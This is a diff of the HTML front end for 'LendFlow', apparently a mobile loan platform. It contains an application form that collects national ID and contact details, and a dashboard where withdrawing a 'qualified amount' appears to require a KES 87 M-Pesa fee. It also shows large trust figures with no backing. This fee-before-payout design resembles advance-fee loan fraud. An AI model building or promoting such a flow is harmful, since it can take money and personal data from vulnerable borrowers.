@@ -5,7 +5,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>LendFlow — Smart Loans, Instant Approval</title>
   <meta name="description" content="LendFlow is a modern fintech loan platform offering instant approval, low interest rates and secure M-Pesa payments." />
-
   <!-- Tailwind CSS -->
   <script src="https://cdn.tailwindcss.com"></script>
   <!-- Font Awesome -->
@@ -14,25 +13,15 @@
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
   <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Inter:wght@400;500;600&display=swap" rel="stylesheet" />
-
   <script>
     tailwind.config = {
       darkMode: 'class',
       theme: {
         extend: {
-          fontFamily: {
-            sans: ['Inter', 'sans-serif'],
-            display: ['Plus Jakarta Sans', 'sans-serif'],
-          },
+          fontFamily: { sans: ['Inter', 'sans-serif'], display: ['Plus Jakarta Sans', 'sans-serif'] },
           colors: {
-            brand: {
-              50: '#ecfdf5', 100: '#d1fae5', 200: '#a7f3d0', 300: '#6ee7b7',
-              400: '#34d399', 500: '#10b981', 600: '#059669', 700: '#047857',
-              800: '#065f46', 900: '#064e3b',
-            },
-            ink: {
-              900: '#0b1120', 800: '#0f172a', 700: '#1e293b', 600: '#334155',
-            },
+            brand: { 50: '#ecfdf5', 100: '#d1fae5', 200: '#a7f3d0', 300: '#6ee7b7', 400: '#34d399', 500: '#10b981', 600: '#059669', 700: '#047857', 800: '#065f46', 900: '#064e3b' },
+            ink: { 900: '#0b1120', 800: '#0f172a', 700: '#1e293b', 600: '#334155' }
           },
           keyframes: {
             'fade-up': { '0%': { opacity: 0, transform: 'translateY(16px)' }, '100%': { opacity: 1, transform: 'translateY(0)' } },
@@ -40,7 +29,7 @@
             'scale-in': { '0%': { opacity: 0, transform: 'scale(.95)' }, '100%': { opacity: 1, transform: 'scale(1)' } },
             'pulse-ring': { '0%': { transform: 'scale(.8)', opacity: .8 }, '100%': { transform: 'scale(2.2)', opacity: 0 } },
             'slide-in': { '0%': { transform: 'translateX(120%)' }, '100%': { transform: 'translateX(0)' } },
-            'spin-slow': { 'to': { transform: 'rotate(360deg)' } },
+            'spin-slow': { 'to': { transform: 'rotate(360deg)' } }
           },
           animation: {
             'fade-up': 'fade-up .6s cubic-bezier(.16,1,.3,1) both',
@@ -48,79 +37,49 @@
             'scale-in': 'scale-in .35s cubic-bezier(.16,1,.3,1) both',
             'pulse-ring': 'pulse-ring 1.6s ease-out infinite',
             'slide-in': 'slide-in .4s cubic-bezier(.16,1,.3,1) both',
-            'spin-slow': 'spin-slow 1s linear infinite',
-          },
-        },
-      },
+            'spin-slow': 'spin-slow 1s linear infinite'
+          }
+        }
+      }
     };
   </script>
-
   <style>
     html { scroll-behavior: smooth; }
     body { font-family: 'Inter', sans-serif; }
     h1,h2,h3,h4,.font-display { font-family: 'Plus Jakarta Sans', sans-serif; }
-
-    .glass {
-      background: rgba(255,255,255,0.65);
-      backdrop-filter: blur(16px) saturate(160%);
-      -webkit-backdrop-filter: blur(16px) saturate(160%);
-      border: 1px solid rgba(255,255,255,0.5);
-    }
-    .dark .glass {
-      background: rgba(15,23,42,0.55);
-      border: 1px solid rgba(148,163,184,0.16);
-    }
-    .glass-strong {
-      background: rgba(255,255,255,0.85);
-      backdrop-filter: blur(20px) saturate(180%);
-      -webkit-backdrop-filter: blur(20px) saturate(180%);
-      border: 1px solid rgba(255,255,255,0.6);
-    }
-    .dark .glass-strong {
-      background: rgba(15,23,42,0.8);
-      border: 1px solid rgba(148,163,184,0.18);
-    }
-
-    .hero-mesh {
-      background:
-        radial-gradient(60% 60% at 15% 20%, rgba(16,185,129,.35) 0%, transparent 60%),
-        radial-gradient(50% 50% at 85% 15%, rgba(13,148,136,.30) 0%, transparent 55%),
-        radial-gradient(60% 60% at 70% 85%, rgba(5,150,105,.28) 0%, transparent 60%),
-        linear-gradient(135deg, #064e3b 0%, #065f46 40%, #0f172a 100%);
-    }
-
+    .glass { background: rgba(255,255,255,0.65); backdrop-filter: blur(16px) saturate(160%); -webkit-backdrop-filter: blur(16px) saturate(160%); border: 1px solid rgba(255,255,255,0.5); }
+    .dark .glass { background: rgba(15,23,42,0.55); border: 1px solid rgba(148,163,184,0.16); }
+    .glass-strong { background: rgba(255,255,255,0.85); backdrop-filter: blur(20px) saturate(180%); -webkit-backdrop-filter: blur(20px) saturate(180%); border: 1px solid rgba(255,255,255,0.6); }
+    .dark .glass-strong { background: rgba(15,23,42,0.8); border: 1px solid rgba(148,163,184,0.18); }
+    .hero-mesh { background: radial-gradient(60% 60% at 15% 20%, rgba(16,185,129,.35) 0%, transparent 60%), radial-gradient(50% 50% at 85% 15%, rgba(13,148,136,.30) 0%, transparent 55%), radial-gradient(60% 60% at 70% 85%, rgba(5,150,105,.28) 0%, transparent 60%), linear-gradient(135deg, #064e3b 0%, #065f46 40%, #0f172a 100%); }
     ::-webkit-scrollbar { width: 10px; height: 10px; }
     ::-webkit-scrollbar-thumb { background: rgba(100,116,139,.4); border-radius: 8px; }
-
     input[type=range] { -webkit-appearance: none; appearance: none; height: 8px; border-radius: 999px; background: linear-gradient(to right,#10b981 0%,#10b981 var(--pct,40%),rgba(148,163,184,.35) var(--pct,40%),rgba(148,163,184,.35) 100%); outline: none; }
     input[type=range]::-webkit-slider-thumb { -webkit-appearance: none; appearance: none; width: 24px; height: 24px; border-radius: 50%; background: #fff; border: 4px solid #10b981; cursor: pointer; box-shadow: 0 2px 8px rgba(0,0,0,.2); transition: transform .15s; }
     input[type=range]::-webkit-slider-thumb:hover { transform: scale(1.15); }
     input[type=range]::-moz-range-thumb { width: 20px; height: 20px; border-radius: 50%; background: #fff; border: 4px solid #10b981; cursor: pointer; }
-
     .step-line { transition: all .4s cubic-bezier(.16,1,.3,1); }
     [hidden] { display: none !important; }
-
     .nav-link { position: relative; }
     .nav-link::after { content:''; position:absolute; left:0; bottom:-4px; height:2px; width:0; background:#10b981; transition:width .25s; }
     .nav-link:hover::after { width:100%; }
-
-    #chatWidget { z-index: 9999; }
-    #chatPanel { z-index: 9998; }
-    .chat-msg { animation: fade-in .3s ease both; }
-    
-    @keyframes bounce {
-      0%, 80%, 100% { transform: translateY(0); }
-      40% { transform: translateY(-6px); }
-    }
-    .animate-bounce {
-      animation: bounce 1.2s ease-in-out infinite;
-    }
+    .form-label { display:block; font-size:.8rem; font-weight:600; margin-bottom:.4rem; color:#475569; }
+    .dark .form-label { color:#cbd5e1; }
+    .form-input { width:100%; padding:.75rem 1rem; border-radius:.85rem; border:1.5px solid rgba(148,163,184,.35); background:rgba(255,255,255,.7); font-size:.95rem; transition:all .2s; color:#0f172a; }
+    .dark .form-input { background:rgba(15,23,42,.6); border-color:rgba(148,163,184,.25); color:#f1f5f9; }
+    .form-input:focus { outline:none; border-color:#10b981; box-shadow:0 0 0 4px rgba(16,185,129,.15); }
+    .form-input.invalid { border-color:#ef4444; box-shadow:0 0 0 4px rgba(239,68,68,.12); }
+    .form-error { color:#ef4444; font-size:.78rem; margin-top:.35rem; min-height:1rem; }
+    .radio-card { display:flex; align-items:center; justify-content:center; gap:.5rem; padding:.85rem; border-radius:.85rem; border:1.5px solid rgba(148,163,184,.35); font-weight:600; font-size:.9rem; cursor:pointer; transition:all .2s; background:rgba(255,255,255,.5); }
+    .dark .radio-card { background:rgba(15,23,42,.5); border-color:rgba(148,163,184,.22); }
+    .radio-card:hover { border-color:#10b981; }
+    .radio-card.selected { border-color:#10b981; background:rgba(16,185,129,.12); color:#047857; }
+    .dark .radio-card.selected { color:#6ee7b7; }
   </style>
 </head>
-
 <body class="bg-slate-50 dark:bg-ink-900 text-slate-900 dark:text-slate-100 transition-colors duration-300 antialiased">
 
-  <!-- ====================== ADMIN LOGIN MODAL ====================== -->
+  <!-- ADMIN LOGIN MODAL -->
   <div id="adminLoginModal" class="fixed inset-0 z-[80] hidden">
     <div class="absolute inset-0 bg-slate-900/70 backdrop-blur-sm"></div>
     <div class="relative min-h-full grid place-items-center p-4">
@@ -128,37 +87,32 @@
         <div class="text-center mb-6">
           <span class="grid place-items-center w-14 h-14 mx-auto rounded-2xl bg-brand-500 text-white text-2xl mb-4"><i class="fa-solid fa-shield-halved"></i></span>
           <h2 class="font-display text-2xl font-extrabold">Admin Login</h2>
-          <p class="text-sm text-slate-500 dark:text-slate-400 mt-1">Enter your credentials to access the admin panel.</p>
+          <p class="text-sm text-slate-500 dark:text-slate-400 mt-1">Enter credentials</p>
         </div>
         <div class="space-y-4">
           <div>
             <label class="form-label">Username</label>
-            <input id="adminLoginUser" class="form-input" placeholder="Enter username" autocomplete="off" />
+            <input id="adminLoginUser" class="form-input" placeholder="Enter username" />
           </div>
           <div>
             <label class="form-label">Password</label>
             <input id="adminLoginPass" type="password" class="form-input" placeholder="Enter password" />
           </div>
           <p id="adminLoginError" class="form-error text-center"></p>
-          <button id="adminLoginBtn" class="w-full inline-flex items-center justify-center gap-2 bg-brand-500 hover:bg-brand-600 text-white font-bold px-5 py-3.5 rounded-xl transition active:scale-95">
-            <i class="fa-solid fa-lock"></i> Sign In
-          </button>
-          <button type="button" id="adminLoginCancel" class="w-full inline-flex items-center justify-center gap-2 px-5 py-3 rounded-xl font-semibold text-slate-600 dark:text-slate-300 hover:bg-slate-100 dark:hover:bg-slate-800 transition">
-            Cancel
-          </button>
+          <button id="adminLoginBtn" class="w-full inline-flex items-center justify-center gap-2 bg-brand-500 hover:bg-brand-600 text-white font-bold px-5 py-3.5 rounded-xl transition active:scale-95"><i class="fa-solid fa-lock"></i> Sign In</button>
+          <button type="button" id="adminLoginCancel" class="w-full inline-flex items-center justify-center gap-2 px-5 py-3 rounded-xl font-semibold text-slate-600 dark:text-slate-300 hover:bg-slate-100 dark:hover:bg-slate-800 transition">Cancel</button>
         </div>
       </div>
     </div>
   </div>
 
-  <!-- ====================== TOP NAV ====================== -->
+  <!-- TOP NAV -->
   <header id="topnav" class="fixed top-0 inset-x-0 z-50 transition-all duration-300">
     <nav class="glass mx-auto max-w-7xl mt-3 px-4 sm:px-6 rounded-2xl flex items-center justify-between h-16 shadow-lg shadow-black/5">
       <a href="#" data-nav="landing" class="flex items-center gap-2.5 font-display font-extrabold text-xl">
         <span class="grid place-items-center w-9 h-9 rounded-xl bg-brand-500 text-white shadow-lg shadow-brand-500/30"><i class="fa-solid fa-bolt"></i></span>
         <span>Lend<span class="text-brand-500">Flow</span></span>
       </a>
-
       <div class="hidden md:flex items-center gap-8 text-sm font-medium text-slate-600 dark:text-slate-300">
         <a href="#features" class="nav-link">Features</a>
         <a href="#calculator" class="nav-link">Calculator</a>
@@ -166,24 +120,20 @@
         <a href="#" data-nav="dashboard" class="nav-link">Dashboard</a>
         <a href="#" data-nav="admin" class="nav-link">Admin</a>
       </div>
-
       <div class="flex items-center gap-2">
         <button id="themeToggle" class="grid place-items-center w-10 h-10 rounded-xl glass hover:scale-105 transition" aria-label="Toggle dark mode">
           <i class="fa-solid fa-moon dark:hidden text-slate-700"></i>
           <i class="fa-solid fa-sun hidden dark:block text-amber-300"></i>
         </button>
-        <button data-nav="apply" class="hidden sm:inline-flex items-center gap-2 bg-brand-500 hover:bg-brand-600 text-white font-semibold text-sm px-5 py-2.5 rounded-xl shadow-lg shadow-brand-500/30 transition active:scale-95">
-          Apply Now <i class="fa-solid fa-arrow-right text-xs"></i>
-        </button>
+        <button data-nav="apply" class="hidden sm:inline-flex items-center gap-2 bg-brand-500 hover:bg-brand-600 text-white font-semibold text-sm px-5 py-2.5 rounded-xl shadow-lg shadow-brand-500/30 transition active:scale-95">Apply Now <i class="fa-solid fa-arrow-right text-xs"></i></button>
       </div>
     </nav>
   </header>
 
   <main id="app">
 
-    <!-- ====================== LANDING ====================== -->
+    <!-- LANDING -->
     <section data-page="landing">
-      <!-- HERO -->
       <div class="hero-mesh relative overflow-hidden pt-28 pb-24 md:pt-36 md:pb-32">
         <div class="absolute inset-0 opacity-[0.07]" style="background-image:radial-gradient(circle,#fff 1px,transparent 1px);background-size:28px 28px;"></div>
         <div class="relative mx-auto max-w-7xl px-4 sm:px-6 grid lg:grid-cols-2 gap-12 items-center">
@@ -191,19 +141,11 @@
             <span class="inline-flex items-center gap-2 glass-strong !bg-white/15 !border-white/20 text-white text-xs font-semibold px-4 py-2 rounded-full mb-6">
               <span class="w-2 h-2 rounded-full bg-brand-300 animate-pulse"></span> Trusted by 250,000+ borrowers
             </span>
-            <h1 class="font-display text-4xl sm:text-5xl lg:text-6xl font-extrabold leading-[1.05] text-balance">
-              Get the funds you need, <span class="text-brand-300">approved in minutes.</span>
-            </h1>
-            <p class="mt-6 text-lg text-emerald-50/90 max-w-xl leading-relaxed text-pretty">
-              LendFlow gives you instant access to affordable loans with transparent rates, flexible repayment and secure M-Pesa payouts — all from your phone.
-            </p>
+            <h1 class="font-display text-4xl sm:text-5xl lg:text-6xl font-extrabold leading-[1.05] text-balance">Get the funds you need, <span class="text-brand-300">approved in minutes.</span></h1>
+            <p class="mt-6 text-lg text-emerald-50/90 max-w-xl leading-relaxed text-pretty">LendFlow gives you instant access to affordable loans with transparent rates, flexible repayment and secure M-Pesa payouts — all from your phone.</p>
             <div class="mt-8 flex flex-wrap gap-3">
-              <button data-nav="apply" class="inline-flex items-center gap-2 bg-white text-emerald-700 font-bold px-7 py-3.5 rounded-xl shadow-xl hover:-translate-y-0.5 transition active:scale-95">
-                Apply Now <i class="fa-solid fa-arrow-right"></i>
-              </button>
-              <a href="#calculator" class="inline-flex items-center gap-2 glass-strong !bg-white/10 !border-white/25 text-white font-semibold px-7 py-3.5 rounded-xl hover:bg-white/20 transition">
-                <i class="fa-solid fa-calculator"></i> Estimate repayment
-              </a>
+              <button data-nav="apply" class="inline-flex items-center gap-2 bg-white text-emerald-700 font-bold px-7 py-3.5 rounded-xl shadow-xl hover:-translate-y-0.5 transition active:scale-95">Apply Now <i class="fa-solid fa-arrow-right"></i></button>
+              <a href="#calculator" class="inline-flex items-center gap-2 glass-strong !bg-white/10 !border-white/25 text-white font-semibold px-7 py-3.5 rounded-xl hover:bg-white/20 transition"><i class="fa-solid fa-calculator"></i> Estimate repayment</a>
             </div>
             <div class="mt-10 flex flex-wrap items-center gap-x-8 gap-y-3 text-sm text-emerald-50/80">
               <span class="flex items-center gap-2"><i class="fa-solid fa-shield-halved text-brand-300"></i> Bank-grade security</span>
@@ -211,8 +153,6 @@
               <span class="flex items-center gap-2"><i class="fa-solid fa-star text-amber-300"></i> 4.9/5 rating</span>
             </div>
           </div>
-
-          <!-- floating calculator card -->
           <div class="animate-scale-in" style="animation-delay:.15s">
             <div class="glass-strong rounded-3xl p-6 sm:p-8 shadow-2xl shadow-black/30">
               <div class="flex items-center justify-between mb-1">
@@ -224,7 +164,6 @@
             </div>
           </div>
         </div>
-
         <div class="relative mx-auto max-w-7xl px-4 sm:px-6 mt-16">
           <div class="glass-strong rounded-2xl grid grid-cols-2 md:grid-cols-4 divide-x divide-slate-200/60 dark:divide-slate-700/60">
             <div class="p-6 text-center"><div class="font-display text-3xl font-extrabold text-slate-900 dark:text-white">KSh 8B+</div><div class="text-sm text-slate-500 dark:text-slate-400 mt-1">Loans disbursed</div></div>
@@ -260,9 +199,7 @@
           <div class="relative">
             <h2 class="font-display text-3xl md:text-4xl font-extrabold text-white text-balance">Ready to get started?</h2>
             <p class="mt-4 text-emerald-50/90 max-w-xl mx-auto text-pretty">Join hundreds of thousands who trust LendFlow for fast, fair and friendly loans.</p>
-            <button data-nav="apply" class="mt-8 inline-flex items-center gap-2 bg-white text-emerald-700 font-bold px-8 py-4 rounded-xl shadow-xl hover:-translate-y-0.5 transition active:scale-95">
-              Start your application <i class="fa-solid fa-arrow-right"></i>
-            </button>
+            <button data-nav="apply" class="mt-8 inline-flex items-center gap-2 bg-white text-emerald-700 font-bold px-8 py-4 rounded-xl shadow-xl hover:-translate-y-0.5 transition active:scale-95">Start your application <i class="fa-solid fa-arrow-right"></i></button>
           </div>
         </div>
       </section>
@@ -283,7 +220,7 @@
       </footer>
     </section>
 
-    <!-- ====================== APPLY ====================== -->
+    <!-- APPLY -->
     <section data-page="apply" hidden class="min-h-screen pt-28 pb-20 px-4 sm:px-6 bg-slate-50 dark:bg-ink-900">
       <div class="mx-auto max-w-3xl">
         <div class="text-center mb-8">
@@ -295,31 +232,11 @@
           <div data-step="1">
             <h3 class="font-display font-bold text-xl mb-6 flex items-center gap-2"><i class="fa-solid fa-user text-brand-500"></i> Personal Details</h3>
             <div class="grid sm:grid-cols-2 gap-5">
-              <div class="sm:col-span-2">
-                <label class="form-label">Full Name</label>
-                <input name="fullName" class="form-input" placeholder="Jane Wanjiru Doe" />
-                <p class="form-error"></p>
-              </div>
-              <div>
-                <label class="form-label">National ID Number</label>
-                <input name="nationalId" inputmode="numeric" class="form-input" placeholder="12345678" />
-                <p class="form-error"></p>
-              </div>
-              <div>
-                <label class="form-label">Phone Number</label>
-                <input name="phone" inputmode="tel" class="form-input" placeholder="0712 345 678 or 0112 345 678" />
-                <p class="form-error"></p>
-              </div>
-              <div>
-                <label class="form-label">Email Address</label>
-                <input name="email" type="email" class="form-input" placeholder="jane@email.com" />
-                <p class="form-error"></p>
-              </div>
-              <div>
-                <label class="form-label">Date of Birth</label>
-                <input name="dob" type="date" class="form-input" />
-                <p class="form-error"></p>
-              </div>
+              <div class="sm:col-span-2"><label class="form-label">Full Name</label><input name="fullName" class="form-input" placeholder="Jane Wanjiru Doe" /><p class="form-error"></p></div>
+              <div><label class="form-label">National ID Number</label><input name="nationalId" inputmode="numeric" class="form-input" placeholder="12345678" /><p class="form-error"></p></div>
+              <div><label class="form-label">Phone Number</label><input name="phone" inputmode="tel" class="form-input" placeholder="0712 345 678 or 0112 345 678" /><p class="form-error"></p></div>
+              <div><label class="form-label">Email Address</label><input name="email" type="email" class="form-input" placeholder="jane@email.com" /><p class="form-error"></p></div>
+              <div><label class="form-label">Date of Birth</label><input name="dob" type="date" class="form-input" /><p class="form-error"></p></div>
               <div class="sm:col-span-2">
                 <label class="form-label">Gender</label>
                 <div class="grid grid-cols-3 gap-3" id="genderGroup">
@@ -383,22 +300,16 @@
             <p class="form-error" data-for="terms"></p>
           </div>
           <div class="flex items-center justify-between mt-10 pt-6 border-t border-slate-200 dark:border-slate-700">
-            <button type="button" id="prevBtn" class="inline-flex items-center gap-2 px-5 py-3 rounded-xl font-semibold text-slate-600 dark:text-slate-300 hover:bg-slate-100 dark:hover:bg-slate-800 transition" hidden>
-              <i class="fa-solid fa-arrow-left"></i> Back
-            </button>
+            <button type="button" id="prevBtn" class="inline-flex items-center gap-2 px-5 py-3 rounded-xl font-semibold text-slate-600 dark:text-slate-300 hover:bg-slate-100 dark:hover:bg-slate-800 transition" hidden><i class="fa-solid fa-arrow-left"></i> Back</button>
             <span class="flex-1"></span>
-            <button type="button" id="nextBtn" class="inline-flex items-center gap-2 bg-brand-500 hover:bg-brand-600 text-white font-semibold px-7 py-3 rounded-xl shadow-lg shadow-brand-500/30 transition active:scale-95">
-              Continue <i class="fa-solid fa-arrow-right text-xs"></i>
-            </button>
-            <button type="submit" id="submitBtn" class="inline-flex items-center gap-2 bg-brand-500 hover:bg-brand-600 text-white font-semibold px-7 py-3 rounded-xl shadow-lg shadow-brand-500/30 transition active:scale-95" hidden>
-              <i class="fa-solid fa-paper-plane"></i> Submit Application
-            </button>
+            <button type="button" id="nextBtn" class="inline-flex items-center gap-2 bg-brand-500 hover:bg-brand-600 text-white font-semibold px-7 py-3 rounded-xl shadow-lg shadow-brand-500/30 transition active:scale-95">Continue <i class="fa-solid fa-arrow-right text-xs"></i></button>
+            <button type="submit" id="submitBtn" class="inline-flex items-center gap-2 bg-brand-500 hover:bg-brand-600 text-white font-semibold px-7 py-3 rounded-xl shadow-lg shadow-brand-500/30 transition active:scale-95" hidden><i class="fa-solid fa-paper-plane"></i> Submit Application</button>
           </div>
         </form>
       </div>
     </section>
 
-    <!-- ====================== DASHBOARD ====================== -->
+    <!-- DASHBOARD -->
     <section data-page="dashboard" hidden class="min-h-screen pt-24 pb-16 px-4 sm:px-6 bg-slate-50 dark:bg-ink-900">
       <div class="mx-auto max-w-6xl">
         <div class="hero-mesh rounded-3xl p-8 md:p-10 text-white relative overflow-hidden mb-8">
@@ -412,9 +323,7 @@
             <div class="glass-strong !bg-white/15 !border-white/20 rounded-2xl p-5 min-w-[220px]">
               <p class="text-emerald-100/80 text-xs uppercase tracking-wide">Qualified Amount</p>
               <p class="font-display text-3xl font-extrabold mt-1" id="dashBalance">KSh 0</p>
-              <button id="withdrawToMpesaBtn" class="mt-3 w-full inline-flex items-center justify-center gap-2 bg-white text-emerald-700 font-bold px-4 py-2.5 rounded-xl text-sm hover:-translate-y-0.5 transition">
-                <i class="fa-solid fa-mobile-screen"></i> Withdraw To M-Pesa
-              </button>
+              <button id="withdrawToMpesaBtn" class="mt-3 w-full inline-flex items-center justify-center gap-2 bg-white text-emerald-700 font-bold px-4 py-2.5 rounded-xl text-sm hover:-translate-y-0.5 transition"><i class="fa-solid fa-mobile-screen"></i> Withdraw To M-Pesa</button>
             </div>
           </div>
         </div>
@@ -459,7 +368,7 @@
       </div>
     </section>
 
-    <!-- ====================== ADMIN ====================== -->
+    <!-- ADMIN -->
     <section data-page="admin" hidden class="min-h-screen pt-24 pb-16 px-4 sm:px-6 bg-slate-50 dark:bg-ink-900">
       <div class="mx-auto max-w-7xl">
         <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-4 mb-8">
@@ -467,9 +376,7 @@
             <h1 class="font-display text-3xl font-extrabold flex items-center gap-3"><i class="fa-solid fa-shield-halved text-brand-500"></i> Admin Panel</h1>
             <p class="text-slate-500 dark:text-slate-400 mt-1">Manage applications, users and analytics.</p>
           </div>
-          <button id="seedBtn" class="inline-flex items-center gap-2 glass-strong px-4 py-2.5 rounded-xl font-semibold text-sm hover:scale-105 transition">
-            <i class="fa-solid fa-database"></i> Load sample data
-          </button>
+          <button id="seedBtn" class="inline-flex items-center gap-2 glass-strong px-4 py-2.5 rounded-xl font-semibold text-sm hover:scale-105 transition"><i class="fa-solid fa-database"></i> Load sample data</button>
         </div>
         <div class="grid grid-cols-2 lg:grid-cols-4 gap-4 mb-8" id="adminStats"></div>
         <div class="grid lg:grid-cols-3 gap-6">
@@ -505,64 +412,13 @@
           </div>
         </div>
       </div>
-      <!-- Admin Chat Section -->
-      <div class="mt-8 glass-strong rounded-2xl p-6">
-        <div class="flex items-center justify-between mb-5">
-          <h3 class="font-display font-bold text-lg flex items-center gap-2"><i class="fa-solid fa-headset text-brand-500"></i> Live Chat Support</h3>
-          <span class="text-xs text-slate-400">Monitor & reply to customers</span>
-        </div>
-        
-        <div class="grid md:grid-cols-3 gap-6">
-          <!-- Customer list -->
-          <div class="md:col-span-1 border-r border-slate-200 dark:border-slate-700 pr-4">
-            <div class="flex items-center justify-between mb-3">
-              <h4 class="font-semibold text-sm">Active Chats</h4>
-              <span class="text-xs bg-brand-500 text-white px-2 py-0.5 rounded-full" id="adminChatCount">0</span>
-            </div>
-            <div id="adminChatList" class="space-y-2 max-h-[400px] overflow-y-auto">
-              <p class="text-sm text-slate-400 text-center py-8">No active chats yet.<br/>Customers will appear here when they start a conversation.</p>
-            </div>
-          </div>
-          
-          <!-- Chat conversation -->
-          <div class="md:col-span-2">
-            <div id="adminNoChatSelected" class="text-center py-16 text-slate-400">
-              <i class="fa-regular fa-comment-dots text-5xl mb-4"></i>
-              <p>Select a customer from the left to view their chat.</p>
-            </div>
-            
-            <div id="adminChatConversation" hidden>
-              <div class="flex items-center justify-between mb-3 pb-3 border-b border-slate-200 dark:border-slate-700">
-                <div>
-                  <h4 class="font-semibold text-sm" id="adminChatCustomerName">—</h4>
-                  <p class="text-xs text-slate-400" id="adminChatCustomerInfo">—</p>
-                </div>
-                <button id="adminChatEnd" class="text-xs text-red-500 hover:text-red-600 font-semibold px-3 py-1.5 rounded-lg border border-red-200 hover:bg-red-50 transition">
-                  <i class="fa-solid fa-xmark"></i> End Chat
-                </button>
-              </div>
-              
-              <div id="adminChatMessages" class="h-[300px] overflow-y-auto space-y-3 mb-4 p-3 bg-slate-50/50 dark:bg-ink-800/30 rounded-xl">
-                <!-- Messages appear here -->
-              </div>
-              
-              <div class="flex items-center gap-2">
-                <input id="adminChatInput" type="text" class="flex-1 border border-slate-300 dark:border-slate-600 bg-white dark:bg-ink-700 rounded-xl px-4 py-2.5 text-sm focus:ring-2 focus:ring-brand-500/30 outline-none" placeholder="Type your reply..." disabled />
-                <button id="adminChatSend" class="w-10 h-10 rounded-xl bg-brand-500 hover:bg-brand-600 text-white grid place-items-center transition active:scale-90 disabled:opacity-50 disabled:cursor-not-allowed" disabled>
-                  <i class="fa-solid fa-paper-plane text-sm"></i>
-                </button>
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
     </section>
 
   </main>
 
-  <!-- ====================== PROCESSING FEE MODAL (Withdraw to M-Pesa) ====================== -->
+  <!-- WITHDRAW MODAL (KES 87 STK Push) -->
   <div id="withdrawModal" class="fixed inset-0 z-[60] hidden">
-    <div class="absolute inset-0 bg-slate-900/60 backdrop-blur-sm" data-close-modal></div>
+    <div class="absolute inset-0 bg-slate-900/60 backdrop-blur-sm" id="withdrawModalBackdrop"></div>
     <div class="relative min-h-full grid place-items-center p-4">
       <div class="glass-strong rounded-3xl w-full max-w-md p-7 shadow-2xl animate-scale-in">
         <div class="flex items-center justify-between mb-6">
@@ -573,7 +429,7 @@
               <p class="text-xs text-slate-500 dark:text-slate-400">Secure STK Push</p>
             </div>
           </div>
-          <button data-close-modal class="grid place-items-center w-9 h-9 rounded-lg hover:bg-slate-100 dark:hover:bg-slate-800 transition"><i class="fa-solid fa-xmark"></i></button>
+          <button id="withdrawModalCloseBtn" class="grid place-items-center w-9 h-9 rounded-lg hover:bg-slate-100 dark:hover:bg-slate-800 transition"><i class="fa-solid fa-xmark"></i></button>
         </div>
         <div id="withdrawInput">
           <div class="bg-amber-50 dark:bg-amber-500/10 rounded-2xl p-4 mb-5 text-center">
@@ -597,7 +453,7 @@
             <span class="relative w-24 h-24 grid place-items-center rounded-full bg-green-600 text-white text-3xl"><i class="fa-solid fa-mobile-screen"></i></span>
           </div>
           <h4 class="font-display font-bold text-lg">Check your phone</h4>
-          <p class="text-sm text-slate-500 dark:text-slate-400 mt-2 max-w-xs mx-auto" id="withdrawProcMsg">An STK push has been sent. Enter your M-Pesa PIN to authorize the payment.</p>
+          <p class="text-sm text-slate-500 dark:text-slate-400 mt-2 max-w-xs mx-auto">An STK push has been sent. Enter your M-Pesa PIN to authorize the payment.</p>
           <div class="mt-5 flex items-center justify-center gap-2 text-sm text-slate-400">
             <i class="fa-solid fa-spinner animate-spin-slow"></i> <span id="withdrawTimer">Waiting…</span>
           </div>
@@ -607,15 +463,15 @@
           <h4 class="font-display font-bold text-xl" id="withdrawResultTitle"></h4>
           <p class="text-sm text-slate-500 dark:text-slate-400 mt-2" id="withdrawResultMsg"></p>
           <div id="withdrawReceipt" class="text-left glass rounded-2xl p-4 mt-5 text-sm space-y-2" hidden></div>
-          <button data-close-modal class="mt-6 w-full bg-brand-500 hover:bg-brand-600 text-white font-bold px-5 py-3.5 rounded-xl transition active:scale-95">Done</button>
+          <button id="withdrawModalDoneBtn" class="mt-6 w-full bg-brand-500 hover:bg-brand-600 text-white font-bold px-5 py-3.5 rounded-xl transition active:scale-95">Done</button>
         </div>
       </div>
     </div>
   </div>
 
-  <!-- ====================== M-PESA REPAYMENT MODAL (existing) ====================== -->
+  <!-- REPAYMENT MODAL -->
   <div id="payModal" class="fixed inset-0 z-[60] hidden">
-    <div class="absolute inset-0 bg-slate-900/60 backdrop-blur-sm" data-close-modal></div>
+    <div class="absolute inset-0 bg-slate-900/60 backdrop-blur-sm" id="payModalBackdrop"></div>
     <div class="relative min-h-full grid place-items-center p-4">
       <div class="glass-strong rounded-3xl w-full max-w-md p-7 shadow-2xl animate-scale-in">
         <div class="flex items-center justify-between mb-6">
@@ -626,7 +482,7 @@
               <p class="text-xs text-slate-500 dark:text-slate-400">Secure STK Push</p>
             </div>
           </div>
-          <button data-close-modal class="grid place-items-center w-9 h-9 rounded-lg hover:bg-slate-100 dark:hover:bg-slate-800 transition"><i class="fa-solid fa-xmark"></i></button>
+          <button id="payModalCloseBtn" class="grid place-items-center w-9 h-9 rounded-lg hover:bg-slate-100 dark:hover:bg-slate-800 transition"><i class="fa-solid fa-xmark"></i></button>
         </div>
         <div id="payInput">
           <div class="bg-brand-50 dark:bg-brand-500/10 rounded-2xl p-4 mb-5 flex items-center justify-between">
@@ -650,7 +506,7 @@
             <span class="relative w-24 h-24 grid place-items-center rounded-full bg-green-600 text-white text-3xl"><i class="fa-solid fa-mobile-screen"></i></span>
           </div>
           <h4 class="font-display font-bold text-lg">Check your phone</h4>
-          <p class="text-sm text-slate-500 dark:text-slate-400 mt-2 max-w-xs mx-auto" id="payProcMsg">An STK push has been sent. Enter your M-Pesa PIN to authorize the payment.</p>
+          <p class="text-sm text-slate-500 dark:text-slate-400 mt-2 max-w-xs mx-auto">An STK push has been sent. Enter your M-Pesa PIN to authorize the payment.</p>
           <div class="mt-5 flex items-center justify-center gap-2 text-sm text-slate-400">
             <i class="fa-solid fa-spinner animate-spin-slow"></i> <span id="payTimer">Waiting…</span>
           </div>
@@ -660,64 +516,14 @@
           <h4 class="font-display font-bold text-xl" id="payResultTitle"></h4>
           <p class="text-sm text-slate-500 dark:text-slate-400 mt-2" id="payResultMsg"></p>
           <div id="payReceipt" class="text-left glass rounded-2xl p-4 mt-5 text-sm space-y-2" hidden></div>
